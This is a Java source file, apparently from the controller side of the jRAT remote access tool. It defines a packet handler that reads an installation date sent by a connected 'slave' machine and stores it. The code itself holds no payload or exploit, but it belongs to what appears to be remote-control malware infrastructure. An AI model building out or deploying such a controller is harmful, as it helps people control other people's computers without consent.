package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;

import java.io.DataInputStream;


public class Packet11InitInstallationDate extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String date = slave.readLine();
		slave.setInstallDate(date);
	}

}